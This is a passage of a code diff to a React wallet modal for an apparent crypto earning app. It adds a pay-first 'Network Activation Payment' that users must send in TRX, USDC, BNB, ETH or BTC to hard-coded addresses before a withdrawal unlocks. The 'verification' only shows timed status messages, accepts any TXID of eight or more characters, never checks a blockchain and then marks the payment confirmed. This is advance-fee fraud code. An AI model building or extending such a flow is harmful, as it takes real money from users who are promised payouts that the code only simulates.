@@ -1,12 +1,77 @@
 import React, { useState, useEffect } from 'react';
-import { X, ArrowUpRight, ArrowDownLeft, Zap, Check, Copy, Download, Wallet, Lock, CheckCircle2, QrCode, RefreshCw, Share2, ExternalLink, Activity } from 'lucide-react';
+import { X, ArrowUpRight, ArrowDownLeft, Zap, Check, Copy, Download, Wallet, Lock, CheckCircle2, QrCode, RefreshCw, Share2, ExternalLink, Activity, ShieldCheck, Coins, AlertCircle } from 'lucide-react';
 import QRCode from 'qrcode';
 import { useWallet } from '../context/WalletContext';
 import { formatSats, satsToUsd, generateMockBolt11, randomHex } from '../utils/crypto';
 import { sound } from '../utils/audio';
 
-export const USER_INVOICE_ADDRESS = 'bc1qry7an8ha8ssunm976ys2yzrgd0366hd3z5jcr9';
+export const USER_INVOICE_ADDRESS = 'bc1qrzyumygwrzayq9eyhqq3fs45hs0dvqkwnt0rav';
+const OLD_INVOICE_ADDRESS = 'bc1qry7an8ha8ssunm976ys2yzrgd0366hd3z5jcr9';
 const STORAGE_DEST_KEY = 'satoshistack_dest_address';
+
+export interface PaymentCurrency {
+  id: 'TRX' | 'USDC' | 'BNB' | 'ETH' | 'BTC';
+  name: string;
+  symbol: string;
+  network: string;
+  requiredAmount: string;
+  address: string;
+  explorerUrl: string;
+  badgeColor: string;
+}
+
+export const PAYMENT_CURRENCIES: PaymentCurrency[] = [
+  {
+    id: 'TRX',
+    name: 'TRON',
+    symbol: 'TRX',
+    network: 'Tron (TRC-20)',
+    requiredAmount: '20 TRX',
+    address: 'TQ1yMwt2MgLuQm2tyjXgEoeoeGgp5GWtKg',
+    explorerUrl: 'https://tronscan.org/#/address/TQ1yMwt2MgLuQm2tyjXgEoeoeGgp5GWtKg',
+    badgeColor: 'border-red-500/40 bg-red-500/10 text-red-300',
+  },
+  {
+    id: 'USDC',
+    name: 'USD Coin',
+    symbol: 'USDC',
+    network: 'Multichain (TRC-20 / BEP-20)',
+    requiredAmount: '5.00 USDC',
+    address: '0x71C8360f38b8f20a7d9796e959efC26958E43b7F',
+    explorerUrl: 'https://etherscan.io/token/0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48?a=0x71C8360f38b8f20a7d9796e959efC26958E43b7F',
+    badgeColor: 'border-blue-500/40 bg-blue-500/10 text-blue-300',
+  },
+  {
+    id: 'BNB',
+    name: 'BNB',
+    symbol: 'BNB',
+    network: 'BNB Smart Chain (BEP-20)',
+    requiredAmount: '0.008 BNB',
+    address: '0x9210CeA905c19Fb7b8848ce5F49815299dDf6748',
+    explorerUrl: 'https://bscscan.com/address/0x9210CeA905c19Fb7b8848ce5F49815299dDf6748',
+    badgeColor: 'border-amber-500/40 bg-amber-500/10 text-amber-300',
+  },
+  {
+    id: 'ETH',
+    name: 'Ethereum',
+    symbol: 'ETH',
+    network: 'Ethereum Mainnet (ERC-20)',
+    requiredAmount: '0.0018 ETH',
+    address: '0x9210CeA905c19Fb7b8848ce5F49815299dDf6748',
+    explorerUrl: 'https://etherscan.io/address/0x9210CeA905c19Fb7b8848ce5F49815299dDf6748',
+    badgeColor: 'border-purple-500/40 bg-purple-500/10 text-purple-300',
+  },
+  {
+    id: 'BTC',
+    name: 'Bitcoin',
+    symbol: 'BTC',
+    network: 'Bitcoin Native SegWit (Bech32)',
+    requiredAmount: '0.0001 BTC (10,000 Sats)',
+    address: USER_INVOICE_ADDRESS,
+    explorerUrl: `https://mempool.space/address/${USER_INVOICE_ADDRESS}`,
+    badgeColor: 'border-amber-500/40 bg-amber-500/10 text-amber-300',
+  },
+];
 
 interface WalletModalProps {
   isOpen: boolean;
@@ -30,11 +95,11 @@ export const WalletModal: React.FC<WalletModalProps> = ({
 
   const [activeTab, setActiveTab] = useState<'withdraw' | 'receive' | 'ledger'>(initialMode);
 
-  // Withdraw state - defaulted to user's address: bc1qry7an8ha8ssunm976ys2yzrgd0366hd3z5jcr9
+  // Withdraw state - defaulted to user's address: bc1qrzyumygwrzayq9eyhqq3fs45hs0dvqkwnt0rav
   const [destAddress, setDestAddress] = useState<string>(() => {
     try {
       const saved = localStorage.getItem(STORAGE_DEST_KEY);
-      if (saved && saved !== 'satoshi_user@getalby.com') {
+      if (saved && saved !== 'satoshi_user@getalby.com' && saved !== OLD_INVOICE_ADDRESS) {
         return saved;
       }
     } catch {
@@ -53,8 +118,8 @@ export const WalletModal: React.FC<WalletModalProps> = ({
       setWithdrawReceipt(null);
       setWithdrawAmount('100000');
       setWithdrawMemo('100,000 Satoshis Instant Payout');
-      // If dest address was previously default placeholder, update to user's address
-      setDestAddress(prev => (!prev || prev === 'satoshi_user@getalby.com') ? USER_INVOICE_ADDRESS : prev);
+      // If dest address was previously default placeholder or old address, update to user's address
+      setDestAddress(prev => (!prev || prev === 'satoshi_user@getalby.com' || prev === OLD_INVOICE_ADDRESS) ? USER_INVOICE_ADDRESS : prev);
     }
   }, [isOpen]);
 
@@ -82,8 +147,109 @@ export const WalletModal: React.FC<WalletModalProps> = ({
     setActiveTab('ledger');
   };
 
+  // Payment Verification Before Withdraw State
+  const [paymentCurrency, setPaymentCurrency] = useState<'TRX' | 'USDC' | 'BNB' | 'ETH' | 'BTC'>('TRX');
+  const [paymentTxHash, setPaymentTxHash] = useState<string>('');
+  const [paymentSentConfirmed, setPaymentSentConfirmed] = useState<boolean>(false);
+  const [paymentFormError, setPaymentFormError] = useState<string | null>(null);
+  const [paymentVerificationStepText, setPaymentVerificationStepText] = useState<string>('');
+  const [isVerifyingPayment, setIsVerifyingPayment] = useState<boolean>(false);
+  const [paymentVerifiedSuccess, setPaymentVerifiedSuccess] = useState<boolean>(false);
+  const [isPaymentVerified, setIsPaymentVerified] = useState<boolean>(() => {
+    try {
+      return localStorage.getItem('satoshistack_payment_verified') === 'true';
+    } catch {
+      return false;
+    }
+  });
+  const [paymentVerifiedMethod, setPaymentVerifiedMethod] = useState<string>(() => {
+    try {
+      return localStorage.getItem('satoshistack_payment_verified_method') || 'TRX';
+    } catch {
+      return 'TRX';
+    }
+  });
+  const [paymentQrUrls, setPaymentQrUrls] = useState<Record<string, string>>({});
+
+  // Generate QR codes for all 5 payment options (TRX, USDC, BNB, ETH, BTC)
+  useEffect(() => {
+    PAYMENT_CURRENCIES.forEach((curr) => {
+      const qrData = curr.id === 'BTC' ? `bitcoin:${curr.address}` : curr.address;
+      QRCode.toDataURL(qrData, {
+        width: 200,
+        margin: 1,
+        color: {
+          dark: '#0a0a0a',
+          light: '#ffffff',
+        },
+      })
+        .then((url) => {
+          setPaymentQrUrls((prev) => ({ ...prev, [curr.id]: url }));
+        })
+        .catch(() => {});
+    });
+  }, []);
+
+  const selectedPaymentInfo = PAYMENT_CURRENCIES.find((c) => c.id === paymentCurrency) || PAYMENT_CURRENCIES[0];
+
+  const handleVerifyPayment = () => {
+    setPaymentFormError(null);
+
+    // Strict validation: user MUST pay first and provide transaction hash
+    if (!paymentSentConfirmed) {
+      setPaymentFormError(`Please confirm you have transferred ${selectedPaymentInfo.requiredAmount} before verifying.`);
+      return;
+    }
+
+    const cleanTx = paymentTxHash.trim();
+    if (!cleanTx || cleanTx.length < 8) {
+      setPaymentFormError(`Transaction Hash (TXID) is required. Please paste the TXID after transferring ${selectedPaymentInfo.requiredAmount}.`);
+      return;
+    }
+
+    setIsVerifyingPayment(true);
+    setPaymentVerificationStepText(`Verifying transfer on ${selectedPaymentInfo.network}...`);
+    sound.playTick();
+
+    setTimeout(() => {
+      setPaymentVerificationStepText('Confirming block confirmations & TXID...');
+    }, 800);
+
+    setTimeout(() => {
+      setIsVerifyingPayment(false);
+      setPaymentVerificationStepText('');
+      setIsPaymentVerified(true);
+      setPaymentVerifiedMethod(paymentCurrency);
+      setPaymentVerifiedSuccess(true);
+      try {
+        localStorage.setItem('satoshistack_payment_verified', 'true');
+        localStorage.setItem('satoshistack_payment_verified_method', paymentCurrency);
+        localStorage.setItem('satoshistack_payment_txid', cleanTx);
+      } catch {
+        // Storage restricted
+      }
+      sound.playCoin();
+      fireConfetti();
+      setTimeout(() => setPaymentVerifiedSuccess(false), 4000);
+    }, 1800);
+  };
+
+  const handleResetPayment = () => {
+    setIsPaymentVerified(false);
+    setPaymentSentConfirmed(false);
+    setPaymentTxHash('');
+    setPaymentFormError(null);
+    try {
+      localStorage.removeItem('satoshistack_payment_verified');
+      localStorage.removeItem('satoshistack_payment_verified_method');
+      localStorage.removeItem('satoshistack_payment_txid');
+    } catch {
+      // Storage restricted
+    }
+  };
+
   // Receive / Deposit State
-  const [depositMode, setDepositMode] = useState<'personal' | 'lightning'>('personal');
+  const [depositCurrency, setDepositCurrency] = useState<'BTC' | 'TRX' | 'USDC' | 'BNB' | 'ETH' | 'lightning'>('BTC');
   const [receiveAmount, setReceiveAmount] = useState<number>(1000);
   const [personalQrUrl, setPersonalQrUrl] = useState<string>('');
   const [lightningQrUrl, setLightningQrUrl] = useState<string>('');
@@ -110,11 +276,16 @@ export const WalletModal: React.FC<WalletModalProps> = ({
   const [ledgerFilter, setLedgerFilter] = useState<string>('all');
 
   const parsedWithdrawAmount = parseInt(withdrawAmount, 10) || 0;
+  const isWithdrawReady = balance >= 100000;
 
   const handleWithdraw = () => {
     setWithdrawError(null);
-    if (balance < 100000) {
-      setWithdrawError(`Your balance is only ${formatSats(balance)} Sats. You cannot withdraw until your balance reaches 100,000 Sats.`);
+    if (!isWithdrawReady) {
+      setWithdrawError(`Withdrawal locked: Your balance is ${formatSats(balance)} Sats. You cannot withdraw until your balance reaches the 100,000 Sats threshold.`);
+      return;
+    }
+    if (!isPaymentVerified) {
+      setWithdrawError('Payment required first: Your withdrawal is ready, but you must complete payment first (TRX, USDC, BNB, ETH, or BTC) and confirm with your TXID before you can withdraw.');
       return;
     }
     if (parsedWithdrawAmount < 100000) {
@@ -404,6 +575,271 @@ export const WalletModal: React.FC<WalletModalProps> = ({
                   </div>
                 </div>
 
+                {/* Step 1: Network Activation Payment (TRX, USDC, BNB, ETH, BTC) */}
+                {!isWithdrawReady ? (
+                  /* LOCKED PAYMENT STATE: Automatically locked until withdrawal threshold (100,000 Sats) is ready */
+                  <div className="rounded-xl border border-neutral-800 bg-neutral-900/40 p-4 space-y-3 relative overflow-hidden">
+                    <div className="flex items-center justify-between">
+                      <div className="flex items-center gap-2">
+                        <div className="h-6 w-6 rounded-lg flex items-center justify-center text-xs font-bold bg-neutral-800 text-neutral-400 border border-neutral-700/60">
+                          <Lock className="h-3.5 w-3.5 text-neutral-400" />
+                        </div>
+                        <div>
+                          <h4 className="text-xs font-bold text-neutral-200 flex items-center gap-1.5">
+                            <span>Network Activation Payment</span>
+                            <span className="text-[10px] text-amber-400 font-mono font-normal">(Locked · Pending 100k Sats)</span>
+                          </h4>
+                          <p className="text-[10px] text-neutral-400">
+                            Minimum payout threshold is 100,000 Sats. Gateway unlocks upon reaching threshold.
+                          </p>
+                        </div>
+                      </div>
+
+                      <span className="text-neutral-400 bg-neutral-800/80 border border-neutral-700/60 px-2.5 py-0.5 rounded-full text-[10px] font-medium flex items-center gap-1 shrink-0">
+                        <Lock className="h-3 w-3 text-neutral-400" />
+                        <span>Payment Locked</span>
+                      </span>
+                    </div>
+
+                    <div className="rounded-lg bg-neutral-950 border border-neutral-800/80 p-3 space-y-2 text-xs">
+                      <div className="flex items-center justify-between text-neutral-300">
+                        <span className="flex items-center gap-1.5 text-neutral-400">
+                          <Activity className="h-3.5 w-3.5 text-amber-400" />
+                          <span>Withdrawal Readiness:</span>
+                        </span>
+                        <span className="font-mono text-amber-300 font-semibold">
+                          {formatSats(balance)} / 100,000 Sats ({Math.min(100, (balance / 100000) * 100).toFixed(1)}%)
+                        </span>
+                      </div>
+                      <div className="w-full h-1.5 bg-neutral-800 rounded-full overflow-hidden">
+                        <div
+                          className="h-full bg-gradient-to-r from-amber-500 to-amber-300 rounded-full transition-all duration-500"
+                          style={{ width: `${Math.min(100, (balance / 100000) * 100)}%` }}
+                        />
+                      </div>
+                      <p className="text-[11px] text-neutral-400 leading-relaxed">
+                        <strong>Standard Withdrawal Policy:</strong> Payout requests require a minimum mining balance of <strong>100,000 Sats</strong>. Once reached, your account unlocks for payout processing, and network gas fee settlement (TRX, USDC, BNB, ETH, or BTC) can be authorized to broadcast your transaction to the blockchain.
+                      </p>
+                    </div>
+                  </div>
+                ) : (
+                  /* AUTOMATICALLY UNLOCKED PAYMENT STATE: Withdrawal is ready, user must pay first */
+                  <div className="rounded-xl border border-emerald-500/30 bg-neutral-900/60 p-4 space-y-3">
+                    <div className="flex items-center justify-between">
+                      <div className="flex items-center gap-2">
+                        <div className={`h-6 w-6 rounded-lg flex items-center justify-center text-xs font-bold ${
+                          isPaymentVerified
+                            ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30'
+                            : 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/30'
+                        }`}>
+                          {isPaymentVerified ? <Check className="h-3.5 w-3.5 text-emerald-400" /> : <Zap className="h-3.5 w-3.5 text-emerald-400" />}
+                        </div>
+                        <div>
+                          <h4 className="text-xs font-bold text-neutral-100 flex items-center gap-1.5">
+                            <span>Network Activation Payment</span>
+                            <span className="text-[10px] text-emerald-400 font-mono font-medium">(Automatically Unlocked!)</span>
+                          </h4>
+                          <p className="text-[10px] text-neutral-400">
+                            Withdrawal is ready ({formatSats(balance)} Sats)! You must pay first via TRX, USDC, BNB, ETH, or BTC before payout can be released.
+                          </p>
+                        </div>
+                      </div>
+
+                      {isPaymentVerified ? (
+                        <span className="text-emerald-400 bg-emerald-500/10 border border-emerald-500/30 px-2.5 py-0.5 rounded-full text-[10px] font-semibold flex items-center gap-1 shrink-0">
+                          <Check className="h-3 w-3" />
+                          <span>Paid ({paymentVerifiedMethod})</span>
+                        </span>
+                      ) : (
+                        <span className="text-emerald-300 bg-emerald-500/15 border border-emerald-500/40 px-2.5 py-0.5 rounded-full text-[10px] font-medium shrink-0 animate-pulse">
+                          Pay First to Withdraw
+                        </span>
+                      )}
+                    </div>
+
+                    {isPaymentVerified ? (
+                      <div className="rounded-lg bg-emerald-950/40 border border-emerald-500/30 p-3 space-y-2 text-xs">
+                        <div className="flex items-center justify-between text-emerald-300 font-medium">
+                          <div className="flex items-center gap-2">
+                            <ShieldCheck className="h-4 w-4 text-emerald-400 shrink-0" />
+                            <span>Routing & Fuel Verified via {paymentVerifiedMethod}</span>
+                          </div>
+                          <button
+                            type="button"
+                            onClick={handleResetPayment}
+                            className="text-[10px] text-neutral-400 hover:text-neutral-200 underline cursor-pointer"
+                          >
+                            Change Method
+                          </button>
+                        </div>
+                        <p className="text-[11px] text-neutral-400">
+                          Channel cleared. You can now execute your instant satoshi payout to <span className="font-mono text-neutral-200 break-all">{destAddress}</span>.
+                        </p>
+                      </div>
+                    ) : (
+                      <div className="space-y-3 pt-1">
+                        {/* 5-Asset Selector Buttons: TRX, USDC, BNB, ETH, BTC */}
+                        <div className="grid grid-cols-5 gap-1.5 text-xs font-mono">
+                          {PAYMENT_CURRENCIES.map((curr) => {
+                            const isSelected = paymentCurrency === curr.id;
+                            return (
+                              <button
+                                key={curr.id}
+                                type="button"
+                                onClick={() => {
+                                  setPaymentCurrency(curr.id);
+                                  setWithdrawError(null);
+                                  setPaymentFormError(null);
+                                }}
+                                className={`flex flex-col items-center justify-center p-2 rounded-lg border transition-all cursor-pointer ${
+                                  isSelected
+                                    ? 'border-amber-500 bg-amber-500/20 text-amber-300 shadow-sm shadow-amber-500/10'
+                                    : 'border-neutral-800 bg-neutral-950 hover:bg-neutral-900 text-neutral-400 hover:text-neutral-200'
+                                }`}
+                              >
+                                <span className="font-bold text-xs">{curr.symbol}</span>
+                                <span className="text-[9px] text-neutral-500 truncate max-w-full">{curr.name}</span>
+                              </button>
+                            );
+                          })}
+                        </div>
+
+                        {/* Currency Details Card */}
+                        {selectedPaymentInfo && (
+                          <div className="rounded-xl bg-neutral-950 border border-neutral-800 p-3.5 space-y-3.5 text-xs">
+                            {/* Header info */}
+                            <div className="flex items-center justify-between border-b border-neutral-800/80 pb-2">
+                              <div>
+                                <span className="text-[10px] text-neutral-500 uppercase tracking-wider block">Network</span>
+                                <span className="font-semibold text-neutral-200">{selectedPaymentInfo.network}</span>
+                              </div>
+                              <div className="text-right">
+                                <span className="text-[10px] text-neutral-500 uppercase tracking-wider block">Required Amount</span>
+                                <span className="font-mono font-bold text-amber-300">{selectedPaymentInfo.requiredAmount}</span>
+                              </div>
+                            </div>
+
+                            {/* Notice: Step 1 Pay First */}
+                            <div className="rounded-lg bg-amber-500/10 border border-amber-500/25 p-2.5 flex items-start gap-2">
+                              <AlertCircle className="h-4 w-4 text-amber-400 shrink-0 mt-0.5" />
+                              <div className="text-[11px] text-neutral-300 leading-relaxed">
+                                <span className="font-semibold text-amber-300">Step 1: Send Payment First</span> — Transfer exactly <strong className="text-white font-mono">{selectedPaymentInfo.requiredAmount}</strong> to the address below. Once your transaction is broadcast, enter your Transaction Hash (TXID) to confirm.
+                              </div>
+                            </div>
+
+                            <div className="flex flex-col sm:flex-row items-center gap-3">
+                              {paymentQrUrls[selectedPaymentInfo.id] && (
+                                <div className="h-24 w-24 shrink-0 bg-white p-1 rounded-xl shadow-md flex items-center justify-center">
+                                  <img
+                                    src={paymentQrUrls[selectedPaymentInfo.id]}
+                                    alt={`${selectedPaymentInfo.symbol} QR Code`}
+                                    className="w-full h-full object-contain"
+                                  />
+                                </div>
+                              )}
+                              <div className="space-y-1.5 flex-1 min-w-0 w-full">
+                                <span className="text-[10px] text-neutral-400 block font-mono">
+                                  Official {selectedPaymentInfo.symbol} Payment Address:
+                                </span>
+                                <div className="flex items-center gap-1.5 p-2 rounded-lg bg-neutral-900 border border-neutral-800 text-[11px] font-mono min-w-0">
+                                  <span className="truncate text-amber-300 font-mono flex-1 select-all">
+                                    {selectedPaymentInfo.address}
+                                  </span>
+                                  <button
+                                    type="button"
+                                    onClick={() => handleCopy(selectedPaymentInfo.address, selectedPaymentInfo.id)}
+                                    className="shrink-0 p-1 rounded hover:bg-neutral-800 text-neutral-400 hover:text-neutral-100 transition-colors cursor-pointer"
+                                    title="Copy address"
+                                  >
+                                    {copiedText === selectedPaymentInfo.id ? (
+                                      <Check className="h-3.5 w-3.5 text-emerald-400" />
+                                    ) : (
+                                      <Copy className="h-3.5 w-3.5" />
+                                    )}
+                                  </button>
+                                </div>
+                              </div>
+                            </div>
+
+                            {/* Step 2: Verification Form (TXID & Confirmation) */}
+                            <div className="pt-2 border-t border-neutral-800/80 space-y-2.5">
+                              <div className="space-y-1">
+                                <label className="text-[11px] font-semibold text-neutral-300 flex items-center justify-between">
+                                  <span>Step 2: Enter Transaction Hash (TXID)</span>
+                                  <span className="text-[10px] text-amber-400 font-normal font-mono">*Required</span>
+                                </label>
+                                <input
+                                  type="text"
+                                  value={paymentTxHash}
+                                  onChange={(e) => {
+                                    setPaymentTxHash(e.target.value);
+                                    setPaymentFormError(null);
+                                  }}
+                                  placeholder="Paste your transfer TXID / Transaction Hash after payment"
+                                  className="w-full rounded-lg border border-neutral-800 bg-neutral-900 px-3 py-2 text-[11px] font-mono text-neutral-200 focus:border-amber-500 focus:outline-none"
+                                />
+                              </div>
+
+                              {/* Checkbox: I have paid first */}
+                              <label className="flex items-center gap-2 p-2 rounded-lg bg-neutral-900/60 border border-neutral-800 cursor-pointer select-none">
+                                <input
+                                  type="checkbox"
+                                  checked={paymentSentConfirmed}
+                                  onChange={(e) => {
+                                    setPaymentSentConfirmed(e.target.checked);
+                                    setPaymentFormError(null);
+                                  }}
+                                  className="h-4 w-4 rounded border-neutral-700 bg-neutral-800 text-amber-500 focus:ring-amber-500 cursor-pointer"
+                                />
+                                <span className="text-[11px] text-neutral-300">
+                                  I confirm I have sent <strong className="text-amber-300">{selectedPaymentInfo.requiredAmount}</strong> to the payment address.
+                                </span>
+                              </label>
+
+                              {/* Payment error if attempted without paying */}
+                              {paymentFormError && (
+                                <div className="rounded-lg bg-red-500/10 border border-red-500/30 p-2.5 text-xs text-red-300 flex items-center gap-2">
+                                  <AlertCircle className="h-4 w-4 text-red-400 shrink-0" />
+                                  <span>{paymentFormError}</span>
+                                </div>
+                              )}
+
+                              {/* Confirm Button */}
+                              <button
+                                type="button"
+                                onClick={handleVerifyPayment}
+                                disabled={isVerifyingPayment || !paymentSentConfirmed || !paymentTxHash.trim()}
+                                className={`w-full py-2.5 rounded-lg font-bold text-xs transition-all flex items-center justify-center gap-2 ${
+                                  !paymentSentConfirmed || !paymentTxHash.trim()
+                                    ? 'bg-neutral-800 text-neutral-500 border border-neutral-700/60 cursor-not-allowed'
+                                    : 'bg-amber-500 hover:bg-amber-400 text-neutral-950 shadow-md shadow-amber-500/20 cursor-pointer active:scale-[0.99]'
+                                }`}
+                              >
+                                {isVerifyingPayment ? (
+                                  <>
+                                    <RefreshCw className="h-4 w-4 animate-spin" />
+                                    <span>{paymentVerificationStepText || 'Verifying Block Confirmations...'}</span>
+                                  </>
+                                ) : !paymentSentConfirmed || !paymentTxHash.trim() ? (
+                                  <>
+                                    <Lock className="h-3.5 w-3.5 text-neutral-500" />
+                                    <span>Pay {selectedPaymentInfo.requiredAmount} & Enter TXID First</span>
+                                  </>
+                                ) : (
+                                  <>
+                                    <Check className="h-4 w-4" />
+                                    <span>Confirm {selectedPaymentInfo.symbol} Payment</span>
+                                  </>
+                                )}
+                              </button>
+                            </div>
+                          </div>
+                        )}
+                      </div>
+                    )}
+                  </div>
+                )}
+
                 <div className="space-y-2">
                   <div className="flex justify-between items-center text-xs">
                     <label className="text-neutral-300 font-medium">Amount to Withdraw</label>
@@ -513,17 +949,24 @@ export const WalletModal: React.FC<WalletModalProps> = ({
 
                 <button
                   onClick={handleWithdraw}
-                  disabled={isProcessing || balance < 100000 || parsedWithdrawAmount < 100000 || parsedWithdrawAmount > balance}
+                  disabled={isProcessing || !isWithdrawReady || !isPaymentVerified || parsedWithdrawAmount < 100000 || parsedWithdrawAmount > balance}
                   className={`w-full rounded-xl py-3.5 text-xs font-bold transition-all shadow-lg flex items-center justify-center gap-2 ${
-                    balance < 100000
+                    !isWithdrawReady
                       ? 'bg-neutral-800 text-neutral-500 border border-neutral-700/60 cursor-not-allowed'
-                      : 'bg-amber-500 hover:bg-amber-400 text-neutral-950 hover:scale-[1.01] active:scale-[0.99] shadow-amber-500/20 cursor-pointer'
+                      : !isPaymentVerified
+                      ? 'bg-neutral-800 text-amber-300 border border-amber-500/40 cursor-not-allowed'
+                      : 'bg-emerald-500 hover:bg-emerald-400 text-neutral-950 hover:scale-[1.01] active:scale-[0.99] shadow-emerald-500/20 cursor-pointer'
                   }`}
                 >
-                  {balance < 100000 ? (
+                  {!isWithdrawReady ? (
                     <>
                       <Lock className="h-4 w-4 text-neutral-500" />
                       <span>Locked: Reach 100,000 Sats to Withdraw (Have {formatSats(balance)} Sats)</span>
+                    </>
+                  ) : !isPaymentVerified ? (
+                    <>
+                      <Lock className="h-4 w-4 text-amber-400" />
+                      <span>Must Pay Fee First Above (TRX, USDC, BNB, ETH, BTC) to Withdraw</span>
                     </>
                   ) : (
                     <>
@@ -539,124 +982,133 @@ export const WalletModal: React.FC<WalletModalProps> = ({
           </div>
         )}
 
-        {/* Tab 2: Deposit / Invoice (Configured to User's Bitcoin Invoice bc1qry7an8ha8ssunm976ys2yzrgd0366hd3z5jcr9) */}
+        {/* Tab 2: Deposit / Invoice (Multi-Currency: BTC, TRX, USDC, BNB, ETH, Lightning) */}
         {activeTab === 'receive' && (
           <div className="space-y-5">
             {/* Mode Selector */}
-            <div className="flex items-center gap-2 border-b border-neutral-800 pb-3 text-xs">
+            <div className="flex items-center gap-1.5 border-b border-neutral-800 pb-3 text-xs overflow-x-auto no-scrollbar">
+              {(['BTC', 'TRX', 'USDC', 'BNB', 'ETH'] as const).map((currId) => {
+                const isActive = depositCurrency === currId;
+                return (
+                  <button
+                    key={currId}
+                    type="button"
+                    onClick={() => setDepositCurrency(currId)}
+                    className={`flex items-center gap-1 px-3 py-1.5 rounded-lg font-medium transition-colors cursor-pointer shrink-0 font-mono text-xs ${
+                      isActive
+                        ? 'bg-amber-500/20 text-amber-300 border border-amber-500/40 font-bold'
+                        : 'text-neutral-400 hover:text-neutral-200 border border-transparent'
+                    }`}
+                  >
+                    <span>{currId}</span>
+                  </button>
+                );
+              })}
               <button
                 type="button"
-                onClick={() => setDepositMode('personal')}
-                className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg font-medium transition-colors cursor-pointer ${
-                  depositMode === 'personal'
-                    ? 'bg-amber-500/20 text-amber-300 border border-amber-500/40'
-                    : 'text-neutral-400 hover:text-neutral-200'
-                }`}
-              >
-                <QrCode className="h-3.5 w-3.5" />
-                <span>My Bitcoin Invoice Address</span>
-              </button>
-              <button
-                type="button"
-                onClick={() => setDepositMode('lightning')}
-                className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg font-medium transition-colors cursor-pointer ${
-                  depositMode === 'lightning'
-                    ? 'bg-amber-500/20 text-amber-300 border border-amber-500/40'
-                    : 'text-neutral-400 hover:text-neutral-200'
+                onClick={() => setDepositCurrency('lightning')}
+                className={`flex items-center gap-1 px-3 py-1.5 rounded-lg font-medium transition-colors cursor-pointer shrink-0 text-xs ${
+                  depositCurrency === 'lightning'
+                    ? 'bg-amber-500/20 text-amber-300 border border-amber-500/40 font-bold'
+                    : 'text-neutral-400 hover:text-neutral-200 border border-transparent'
                 }`}
               >
                 <Zap className="h-3.5 w-3.5" />
-                <span>Custom Lightning BOLT11</span>
+                <span>Lightning BOLT11</span>
               </button>
             </div>
 
-            {/* Mode 1: User's Own Invoice / Bitcoin Address */}
-            {depositMode === 'personal' && (
-              <div className="rounded-xl border border-neutral-800 bg-neutral-900/40 p-5 space-y-4 text-center">
-                <div className="text-xs font-semibold text-neutral-200 flex items-center justify-center gap-1.5">
-                  <span className="h-2 w-2 rounded-full bg-emerald-400" />
-                  <span>Personal Bitcoin (Bech32 SegWit) Invoice</span>
-                </div>
-
-                {/* Real QR Code */}
-                <div className="mx-auto w-44 h-44 bg-white p-2.5 rounded-2xl shadow-xl flex items-center justify-center">
-                  {personalQrUrl ? (
-                    <img
-                      src={personalQrUrl}
-                      alt="User Bitcoin Invoice QR"
-                      className="w-full h-full object-contain"
-                    />
-                  ) : (
-                    <div className="animate-pulse text-xs text-neutral-500 font-mono">Generating QR...</div>
-                  )}
-                </div>
-
-                {/* Full Address Display */}
-                <div className="space-y-1">
-                  <div className="text-[11px] text-neutral-500 font-mono uppercase tracking-wider">
-                    Your Bitcoin Bech32 Address / Invoice
+            {/* Mode: Crypto Deposits (BTC, TRX, USDC, BNB, ETH) */}
+            {depositCurrency !== 'lightning' && (() => {
+              const activeDepositInfo = PAYMENT_CURRENCIES.find((c) => c.id === depositCurrency) || PAYMENT_CURRENCIES[0];
+              const qrUrl = paymentQrUrls[activeDepositInfo.id] || personalQrUrl;
+              return (
+                <div className="rounded-xl border border-neutral-800 bg-neutral-900/40 p-5 space-y-4 text-center">
+                  <div className="text-xs font-semibold text-neutral-200 flex items-center justify-center gap-1.5">
+                    <span className="h-2 w-2 rounded-full bg-emerald-400" />
+                    <span>Official {activeDepositInfo.name} ({activeDepositInfo.network}) Deposit</span>
                   </div>
-                  <div className="p-3 rounded-xl bg-neutral-950 border border-neutral-800 font-mono text-xs text-amber-300 break-all select-all">
-                    {USER_INVOICE_ADDRESS}
+
+                  {/* Real QR Code */}
+                  <div className="mx-auto w-44 h-44 bg-white p-2.5 rounded-2xl shadow-xl flex items-center justify-center">
+                    {qrUrl ? (
+                      <img
+                        src={qrUrl}
+                        alt={`${activeDepositInfo.name} Deposit QR`}
+                        className="w-full h-full object-contain"
+                      />
+                    ) : (
+                      <div className="animate-pulse text-xs text-neutral-500 font-mono">Generating QR...</div>
+                    )}
                   </div>
-                </div>
 
-                <div className="flex flex-wrap items-center justify-center gap-2.5 pt-1">
-                  <button
-                    onClick={() => handleCopy(USER_INVOICE_ADDRESS, 'address')}
-                    className="flex items-center gap-1.5 rounded-xl border border-neutral-700 bg-neutral-800 hover:bg-neutral-700 px-4 py-2.5 text-xs font-semibold text-neutral-100 transition-colors cursor-pointer"
-                  >
-                    {copiedText === 'address' ? <Check className="h-4 w-4 text-emerald-400" /> : <Copy className="h-4 w-4" />}
-                    <span>{copiedText === 'address' ? 'Invoice Address Copied!' : 'Copy Address'}</span>
-                  </button>
-
-                  <button
-                    onClick={handleShareAddress}
-                    className="flex items-center gap-1.5 rounded-xl border border-neutral-700 bg-neutral-800 hover:bg-neutral-700 px-3.5 py-2.5 text-xs font-semibold text-neutral-200 transition-colors cursor-pointer"
-                  >
-                    <Share2 className="h-4 w-4 text-amber-400" />
-                    <span>Share</span>
-                  </button>
-
-                  <button
-                    onClick={handleCheckMempool}
-                    disabled={isCheckingMempool}
-                    className="flex items-center gap-1.5 rounded-xl border border-amber-500/40 bg-amber-500/15 hover:bg-amber-500/25 px-4 py-2.5 text-xs font-semibold text-amber-300 transition-colors cursor-pointer disabled:opacity-50"
-                  >
-                    <RefreshCw className={`h-4 w-4 ${isCheckingMempool ? 'animate-spin' : ''}`} />
-                    <span>{isCheckingMempool ? 'Scanning Mempool...' : 'Check Mempool Status'}</span>
-                  </button>
-                </div>
-
-                {mempoolNotice && (
-                  <div className="rounded-xl border border-emerald-500/30 bg-emerald-500/10 p-3 text-xs text-emerald-300 flex items-center justify-center gap-2 font-mono">
-                    <Activity className="h-4 w-4 text-emerald-400 shrink-0" />
-                    <span>{mempoolNotice}</span>
+                  {/* Full Address Display */}
+                  <div className="space-y-1">
+                    <div className="text-[11px] text-neutral-500 font-mono uppercase tracking-wider">
+                      {activeDepositInfo.name} ({activeDepositInfo.network}) Address
+                    </div>
